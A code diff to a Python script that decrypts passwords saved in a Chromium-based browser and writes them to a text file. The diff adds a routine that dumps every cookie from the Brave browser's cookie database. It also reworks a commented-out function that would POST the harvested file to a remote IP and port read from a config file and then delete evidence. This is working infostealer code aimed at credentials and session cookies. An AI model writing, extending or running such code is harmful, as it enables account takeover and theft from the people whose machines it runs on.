@@ -9,7 +9,9 @@ from Crypto.Cipher import AES
 import win32crypt
 import sys
 
-
+##
+##Extract passwords
+##
 def delete_file(file):
     try:
         os.remove(file)
@@ -17,26 +19,27 @@ def delete_file(file):
     except:
         pass
 
-
-#try:
-#    with open("todo.txt", "r") as f:
-#        lines = f.readlines()
-#        ip_address = lines[0].strip()
-#        interval = int(lines[1])
-#        port = lines[2]
-#        f.close()
-#except:
-#    pass
-#def send():
+#def get_url():
+#   try:
+#        with open("todo.txt", "r") as f:
+#           lines = f.readlines()
+#           ip_address = lines[0].strip()
+#           interval = int(lines[1])
+#           port = lines[2]
+#           f.close()
+#        return (ip_address, interval, port)
+#   except:
+#       pass
+#def send(file):
 #    try:
-#        with open("passwords.txt", "r") as f:
+#        with open(file, "r") as f:
 #            payload = json.dumps({"content": f.read()})
-#            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
-#        delete_file()
+#            requests.post(f"http://{get_url()[0]}:{get_url()[2]}", data=payload, headers={"Content-Type": "application/json"})
+#        delete_file("data.db")
 #        return
 #    except:
 #        try:
-#            timer = threading.Timer(interval, send)
+#            timer = threading.Timer(get_url()[1], send)
 #            timer.start()
 #        except:
 #            return
@@ -58,8 +61,8 @@ def load_path(id):
         return db_path
 
 
-def store_data(data):
-    with open("passwords.txt", 'a') as f:
+def store_data(file, data):
+    with open(file, 'a') as f:
         f.write("\n##########################################")
         f.write(data)
         f.write("##########################################")
@@ -122,7 +125,7 @@ def save_passwords(db_dir, key_dir):
 
         if username or decrypt_password(row[3], fetch_key(key_dir)):
             data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_password(row[3], fetch_key(key_dir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
-            store_data(data)
+            store_data("passwords.txt", data)
         else:
             continue
 
@@ -132,6 +135,35 @@ def save_passwords(db_dir, key_dir):
     cursor.close()
     db.close()
     delete_file(file)
-    #send()
+    #send("passwords.txt")
 
 save_passwords(load_path("db"), load_path("dir"))
+
+##
+##Extract cookies
+##
+def fetch_cookies(dir):
+    try:
+        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
+
+        conn = sqlite3.connect(file)
+        query = 'SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
+        cursor = conn.execute(query)
+    except:
+        pass
+    
+    #cookies = []
+
+    try:
+        for row in cursor:
+            name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
+            
+            cookie = f"\nName: {name}\nValue: {value}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
+            #cookies.append(cookie)
+            store_data("cookies.txt", cookie)
+        conn.close()
+    except:
+        pass
+    #return cookies
+
+fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
